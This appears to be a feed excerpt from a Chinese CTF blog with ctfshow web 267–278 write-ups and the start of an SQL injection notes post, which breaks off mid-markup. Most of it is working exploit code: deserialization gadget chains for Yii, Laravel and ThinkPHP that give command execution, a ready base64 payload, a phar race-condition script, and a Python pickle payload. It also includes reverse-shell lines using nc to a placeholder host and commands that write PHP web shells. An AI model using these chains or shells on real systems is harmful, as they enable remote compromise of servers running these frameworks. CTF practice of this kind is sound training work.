&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/ctfshow/Web-vip/web266.jpg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-267&#34;&gt;&lt;a href=&#34;#web-267&#34; class=&#34;headerlink&#34; title=&#34;web 267&#34;&gt;&lt;/a&gt;web 267&lt;/h1&gt;&lt;p&gt;弱密码登入admin/admin&lt;/p&gt;
&lt;p&gt;查看源码知view-source&lt;/p&gt;
&lt;p&gt;在page下找到反序列换入口&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;unserialize(base64_decode($_GET[&#39;code&#39;]))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里为&lt;code&gt;yii&lt;/code&gt;的反序列化链&lt;/p&gt;
&lt;p&gt;只有&lt;code&gt;passthru&lt;/code&gt;有回显&lt;/p&gt;
&lt;p&gt;最后的payload：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;?r=/backdoor/shell&amp;amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&amp;gt;checkAccess = &#39;passthru&#39;;
            $this-&amp;gt;id = &#39;tac /flag&#39;;
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this-&amp;gt;formatters[&#39;close&#39;] = [new CreateAction, &#39;run&#39;];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this-&amp;gt;_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwczovL21wLndlaXhpbi5xcS5jb20vcz9fX2Jpej1NelU1TURJME9ESTVNUT09Jm1pZD0yMjQ3NDg1MTI5JmlkeD0xJnNuPWIyN2UzZmU4NDVkYWVlMmZiMTNiYjlmMzZmNTNhYjQw&#34;&gt;复现文章2&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-268&#34;&gt;&lt;a href=&#34;#web-268&#34; class=&#34;headerlink&#34; title=&#34;web 268&#34;&gt;&lt;/a&gt;web 268&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&amp;gt;checkAccess = &#39;phpinfo&#39;;
            $this-&amp;gt;id = &#39;1&#39;;
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为 isRunning
            $this-&amp;gt;formatters[&#39;isRunning&#39;] = [new CreateAction(), &#39;run&#39;];
        }
    }
}

// poc2
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this-&amp;gt;processes = [new Generator()];
        }
    }
}
namespace{
    // 生成 poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-269&#34;&gt;&lt;a href=&#34;#web-269&#34; class=&#34;headerlink&#34; title=&#34;web 269&#34;&gt;&lt;/a&gt;web 269&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this-&amp;gt;checkAccess = &#39;phpinfo&#39;;
            $this-&amp;gt;id = &#39;1&#39;;
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为 isRunning
            $this-&amp;gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this-&amp;gt;description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this-&amp;gt;path = new See;
            $this-&amp;gt;keys = array(
                &#34;axin&#34;=&amp;gt;array(&#34;is&#34;=&amp;gt;&#34;handsome&#34;)
            );
        }
    }
    // 生成 poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-270&#34;&gt;&lt;a href=&#34;#web-270&#34; class=&#34;headerlink&#34; title=&#34;web 270&#34;&gt;&lt;/a&gt;web 270&lt;/h1&gt;&lt;p&gt;也可以反弹shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$exp = new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#34;nc xx.xx.xx.xx port -e /bin/sh&#34;);&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this-&amp;gt;checkAccess = $func;
            $this-&amp;gt;id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this-&amp;gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &#34;run&#34;];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this-&amp;gt;_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &#34;echo &#39;&amp;lt;?php eval(\$_POST[1]); ?&amp;gt;&#39; &amp;gt; 1.php&#34;);
    echo(base64_encode(serialize($exp)));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-271&#34;&gt;&lt;a href=&#34;#web-271&#34; class=&#34;headerlink&#34; title=&#34;web 271&#34;&gt;&lt;/a&gt;web 271&lt;/h1&gt;&lt;p&gt;laravel5.7 反序列化漏洞&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        public $test;
        protected $app;
        protected $command;
        protected $parameters;

        public function __construct($test, $app, $command, $parameters)
        {
            $this-&amp;gt;test = $test;                 // 一个实例化的类 Illuminate\Auth\GenericUser
            $this-&amp;gt;app = $app;                   // 一个实例化的类 Illuminate\Foundation\Application
            $this-&amp;gt;command = $command;           // 要执行的 php 函数 system
            $this-&amp;gt;parameters = $parameters;     // 要执行的 php 函数的参数  array (&#39;id&#39;)
        }
    }
}

namespace Faker {
    class DefaultGenerator
    {
        protected $default;

        public function __construct($default = null)
        {
            $this-&amp;gt;default = $default;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        protected $instances = [];

        public function __construct($instances = [])
        {
            $this-&amp;gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;] = $instances;
        }
    }
}

namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array(&#34;hello&#34; =&amp;gt; &#34;world&#34;));

    $app = new Illuminate\Foundation\Application();

    $application = new Illuminate\Foundation\Application($app);

    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#39;system&#39;, array(&#39;whoami&#39;));

    echo urlencode(serialize($pendingcommand));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-272、273&#34;&gt;&lt;a href=&#34;#web-272、273&#34; class=&#34;headerlink&#34; title=&#34;web 272、273&#34;&gt;&lt;/a&gt;web 272、273&lt;/h1&gt;&lt;p&gt;laravel5.8 反序列化漏洞&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
/*
Author:monitor
description:
    laravel deserialization chain
*/
namespace Illuminate\Broadcasting
{
    class PendingBroadcast{
        protected $events;
        protected $event;
        public function __construct($events,$event)
        {
            $this-&amp;gt;events = $events;
            $this-&amp;gt;event = $event;
        }
    }
}

namespace Illuminate\Bus
{
    class Dispatcher{
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this-&amp;gt;queueResolver = $queueResolver;
        }
    }
}

namespace Mockery\Loader
{
    class EvalLoader{

    }
}

namespace Mockery\Generator
{
    class MockDefinition{
        protected $config;
        protected $code;
        public function __construct($config,$code){
            $this-&amp;gt;config = $config;
            $this-&amp;gt;code = $code;
        }
    }
    class MockConfiguration{
        protected $name;
        public function __construct($name)
        {
            $this-&amp;gt;name = $name;
        }
    }
}

namespace Illuminate\Queue
{
    class CallQueuedClosure{
        public $connection;
        public function __construct($connection)
        {
            $this-&amp;gt;connection = $connection;
        }
    }
}

namespace
{   
    if($argc&amp;lt;2){
        echo &#34;Description:\n\tUse laravel deserialization to eval php code,don&#39;t need to input php tags.&#34;;
        echo &#34;\nUsage:&#34; .$argv[0] . &#34; &amp;lt;code&amp;gt;&#34;;
        exit();
    }
    $code = $argv[1];
    $mockconfiguration = new Mockery\Generator\MockConfiguration(&#34;pass&#34;);
    $mockdefination = new Mockery\Generator\MockDefinition($mockconfiguration,&#34;&amp;lt;?php &#34;.$code.&#34; exit;?&amp;gt;&#34;);
    $callqueuedclosure = new Illuminate\Queue\CallQueuedClosure($mockdefination);
    $evaload = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evaload,&#34;load&#34;));
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$callqueuedclosure);
    echo urlencode(serialize($pendingbroadcast));
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;xxxxxxxxxx&amp;nbsp;0;alter table ctfshow_user change &lt;code&gt;username&lt;/code&gt; &lt;code&gt;pass2&lt;/code&gt; varchar(100);alter table ctfshow_user change &lt;code&gt;pass&lt;/code&gt; &lt;code&gt;username&lt;/code&gt; varchar(100);alter table ctfshow_user change &lt;code&gt;pass2&lt;/code&gt; &lt;code&gt;pass&lt;/code&gt; varchar(100);sql&lt;/p&gt;
&lt;h1 id=&#34;web-274&#34;&gt;&lt;a href=&#34;#web-274&#34; class=&#34;headerlink&#34; title=&#34;web 274&#34;&gt;&lt;/a&gt;web 274&lt;/h1&gt;&lt;p&gt;thinkphp 5.1 反序列化漏洞&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this-&amp;gt;append = [&#34;lin&#34;=&amp;gt;[&#34;calc.exe&#34;,&#34;calc&#34;]];
        $this-&amp;gt;data = [&#34;lin&#34;=&amp;gt;new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = &#34;system&#34;;
    protected $config = [
        // 表单 ajax 伪装变量
        &#39;var_ajax&#39;         =&amp;gt; &#39;_ajax&#39;,  
    ];
    function __construct(){
        $this-&amp;gt;filter = &#34;system&#34;;
        $this-&amp;gt;config = [&#34;var_ajax&#34;=&amp;gt;&#39;lin&#39;];
        $this-&amp;gt;hook = [&#34;visible&#34;=&amp;gt;[$this,&#34;isAjax&#34;]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this-&amp;gt;files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;$lin&lt;/code&gt; GET 赋值&lt;/p&gt;
&lt;h1 id=&#34;web-275&#34;&gt;&lt;a href=&#34;#web-275&#34; class=&#34;headerlink&#34; title=&#34;web 275&#34;&gt;&lt;/a&gt;web 275&lt;/h1&gt;&lt;p&gt;&lt;code&gt;__destruct&lt;/code&gt;当对象被销毁时调用，所以我们不需要用到反序列化函数。那么只要&lt;code&gt;$this-&amp;gt;evilfile&lt;/code&gt;是&lt;code&gt;true&lt;/code&gt;就可以执行系统命令了。最后再拼接一下命令&lt;br&gt;payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?fn=;cat f*
data: flag=123
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-276&#34;&gt;&lt;a href=&#34;#web-276&#34; class=&#34;headerlink&#34; title=&#34;web 276&#34;&gt;&lt;/a&gt;web 276&lt;/h1&gt;&lt;p&gt;在上个题的基础上增了了判断&lt;code&gt;$this-&amp;gt;admin&lt;/code&gt;所以真的需要我们去通过反序列化修改&lt;code&gt;admin&lt;/code&gt;的值了。因为题目中没有反序列化函数，所以需要通过其他方式。&lt;br&gt;因为题目中有写文件的函数，所以可以通过&lt;code&gt;file_put_contents&lt;/code&gt;写&lt;code&gt;phar&lt;/code&gt;文件，然后再通过&lt;code&gt;file_put_contents&lt;/code&gt;触发&lt;code&gt;phar&lt;/code&gt;反序列化。当然我们得在删除文件前执行完这两个操作，所以需要用到条件竞争。&lt;br&gt;生成&lt;code&gt;phar&lt;/code&gt;文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

class filter{
    public $filename = &#34;1|cat f*&#34;;
    public $filecontent;
    public $evilfile = true;
    public $admin = true;
}

$phar = new Phar(&#34;phar.phar&#34;);
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&#34;);

$o = new filter();
$phar-&amp;gt;setMetadata($o);
$phar-&amp;gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;);
$phar-&amp;gt;stopBuffering();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;条件竞争&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import threading
import base64
url = &#39;http://b1238473-a3bb-431f-a39e-3cd285bcb95e.chall.ctf.show/&#39;

f = open(&#39;./phar.phar&#39;, &#39;rb&#39;)

data = f.read()
flag = False

def work1():
    requests.post(url+&#34;?fn=a&#34;, data=data)


def work2():
    global flag
    r = requests.post(url+&#34;?fn=phar://phar.phar/&#34;, data=&#34;&#34;)
    if &#34;flag{&#34; in r.text and flag is False:
        print(base64.b64encode(r.text.encode()))
        flag = True

while flag is False:
    a = threading.Thread(target=work1)
    b = threading.Thread(target=work2)
    a.start()
    b.start()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-277-278&#34;&gt;&lt;a href=&#34;#web-277-278&#34; class=&#34;headerlink&#34; title=&#34;web 277 278&#34;&gt;&lt;/a&gt;web 277 278&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import pickle
import base64
class A(object):
    def __reduce__(self):
        return(eval,(&#39;__import__(&#34;os&#34;).popen(&#34;nc xxx.xxx.xxx.xxx 4567 -e /bin/sh&#34;).read()&#39;,))
a=A()
test=pickle.dumps(a)
print(base64.b64encode(test))
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/35cb7ca5/</guid>
            <title>SQL 注入</title>
            <link>http://dpm12345.cn/posts/35cb7ca5/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Tue, 04 Oct 2022 22:15:40 +0800</pubDate>
            <description><![CDATA[ &lt;ul&gt;
&lt;li&gt;
&lt;p&gt;若对返回值进行过滤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;可以在该字段名前加上 &lt;code&gt;hex()&lt;/code&gt;  十六进制编码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 replace 函数，对返回结果进行替换，绕过 waf，得到替换结果后再替换回来&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql 注入也可以将内容写入到外部文件中，&lt;/p&gt;
&lt;p&gt;如 &lt;code&gt;select &#34;&amp;lt;?php eval($_POST[1]);?&amp;gt;&#34; into outfile &#39;/var/www/html/1.php&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;为了防止失败，可对 php 语句进行编码 &lt;code&gt;(base64+url)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后访问 1.php，可以发现成功，然后使用蚁剑连接，进行数据操作，然后新建数据库 (信息在根目录下 &lt;code&gt;api&lt;/code&gt;  下的 &lt;code&gt;config.php&lt;/code&gt;  文件中)&lt;/p&gt;
&lt;p&gt;之后找到 flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果过滤 sql 语句中的某个值，如 &lt;code&gt;username=flag&lt;/code&gt; ，而 flag 被过滤，那么可以使用 &lt;code&gt;like+通配符&lt;/code&gt; 的方法，如 &lt;code&gt;like &#39;%fla%&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;%&lt;/code&gt;  匹配任意个字符， &lt;code&gt;_&lt;/code&gt; 匹配一个字符，同样也可以使用十六进制编码&lt;/p&gt;
&lt;p&gt;如 &lt;code&gt;select id,username,password from users where username=0x666c6167;&lt;/code&gt;  也是可以的，查询出 &lt;code&gt;username=&#39;flag&#39;&lt;/code&gt;  的情况&lt;/p&gt;
&lt;p&gt;或者用 &lt;code&gt;base64&lt;/code&gt;  编码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;where 被过滤可以使用 having，同 where 用法&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;若 ban 了数字，那么可以使用 &lt;code&gt;true，false&lt;/code&gt;  来代替 &lt;code&gt;1 和 0&lt;/code&gt; ，然后利用加法构建任意数字，接着利用 &lt;code&gt;concat&lt;/code&gt;  函数拼接字符串，从而生成无数字的语句的 (但实际上包含语句)，如&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select username,password from users where id=concat(true,true);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;等价于 &lt;code&gt;select username,password from users where id=&#39;11&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对于 select 的查询语句&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select count(*) from users where username=&#39;8&#39; or &#39;a23&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回结果是 0&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select count(*) from users where username=&#39;8&#39; or &#39;1a&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回结果是数据条数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select count(*) from users where username=&#39;8&#39; or &#39;1&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回结果是数据条数&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select count(*) from users where username=&#39;8&#39; or &#39;0&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回结果是 0&lt;/p&gt;
&lt;p&gt;那么也就是说，在 or 语句中，0，字母开头的为非，数字开头的为正&lt;/p&gt;
&lt;p&gt;可利用该特性进行 SQL 注入&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sql 语句的查询机制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如 sql 语句 &lt;code&gt;select username,password from users where username=&#39;flag&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;它将会返回 &lt;code&gt;username&lt;/code&gt;  为 &lt;code&gt;flag&lt;/code&gt;  的值的数据&lt;/p&gt;
&lt;p&gt;但如果此时将 &lt;code&gt;username=&#39;flag&#39;&lt;/code&gt;  换为 &lt;code&gt;username=0&lt;/code&gt;  后，是否还能查到 flag 呢？&lt;/p&gt;
&lt;p&gt;答案是肯定的，这是因为，这里的等于是弱等于，&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;substr 如果被禁了，可以使用 left 代替，其中 left 只有两个参数，第一个为字符串，第二个为个数，即从最左端开始&lt;/p&gt;
&lt;p&gt;如 &lt;code&gt;select left(&#34;abc&#34;,2);&lt;/code&gt;  返回 &lt;code&gt;ab&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者也可以使用 &lt;code&gt;lpad&lt;/code&gt; ，其有三个参数&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;LPAD&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;len&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;padstr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;Returns&lt;/span&gt; the string str&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;padded &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; the string padstr &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; a length &lt;span class=&#34;token keyword&#34;&gt;of&lt;/span&gt; len characters&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;If&lt;/span&gt; str &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; longer than len&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; the &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;is&lt;/span&gt; shortened &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; len characters&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; LPAD&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hi&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;??&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;??hi&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;mysql&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; LPAD&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hi&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;??&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;h&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;那么可以 &lt;code&gt;lpad(&#34;abc&#34;,2,&#34;&#34;);&lt;/code&gt;  达到与 left 同样效果&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;时间盲注&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sleep(3)&lt;/strong&gt; 直截了当的时间盲注&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;benchmark()&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The BENCHMARK() function executes the expression expr repeatedly count times. It may be used to time how quickly MySQL processes the expression. The result value is 0, or NULL for inappropriate arguments such as a NULL or negative repeat count.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;rlike&lt;/strong&gt; 正则匹配&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多次查询排序&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ip&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token 